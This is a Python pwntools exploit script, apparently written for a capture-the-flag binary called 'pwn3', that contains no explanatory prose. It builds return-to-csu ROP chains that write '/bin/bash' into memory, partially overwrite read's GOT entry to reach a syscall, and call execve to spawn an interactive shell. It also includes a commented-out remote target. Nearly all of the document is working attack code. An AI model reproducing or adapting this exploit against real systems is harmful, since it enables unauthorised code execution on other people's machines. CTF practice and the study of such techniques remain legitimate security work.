from pwn import *
import time

p = process("./pwn3")
#p = remote("192.168.233.136", 51007)
context.log_level = "debug"
gadget1 = 0x00000000004006E6
gadget2 = 0x00000000004006D0
init_start = 0x0000000000600e10
vul_addr = 0x0000000000400666
read_got = 0x0000000000601018
start_addr = 0x0000000000400510

read_offset = 0x110140
one_gadget = 0x4f432

def ret_csu(r12, r13, r14, r15, last):
	payload = (0xA + 8) * 'O'  
	#padding
	payload += p64(gadget1) + 'a' * 8    
	#gadgets1
	payload += p64(0) + p64(1)
	#rbx=0, rbp=1
	payload += p64(r12)
	#call
	payload += p64(r13) + p64(r14) + p64(r15)
	payload += p64(gadget2)
	#gadgets2
	payload += 'a' * 56
	#pop padding
	payload += p64(last)
	return payload


def main():
	payload = ret_csu(read_got, 0, 0x601068, 10, start_addr)
	gdb.attach(p)
	pause()	
	p.send(payload)
	payload = "/bin/bash\x00"
	
	pause()	
	p.send(payload)
	# overwrite read_got with syscall low-byte
	payload = ret_csu(read_got, 0, read_got, 1, gadget1)
	#            add rsp,8 rbx=0    rbp=1    r12             rdi             rsi      rdx      
	payload_write_0x3b = 'a'*8 + p64(0) + p64(1) + p64(read_got) + p64(1) + p64(0x601068) + p64(0x3b) + p64(gadget2) + 'a'*56 + p64(gadget1)
	payload_exec = 'a'*8 + p64(0) + p64(1) + p64(read_got) + p64(0x601068) + p64(0) + p64(0) + p64(gadget2) + 'a'*56 + p64(gadget1)
	payload = payload + payload_write_0x3b + payload_exec	
	pause()
	p.send(payload)
	pause()
	p.send("\x4f") # send to overwrite read_got
	pause()
	p.interactive()


if __name__ == "__main__":
	main()
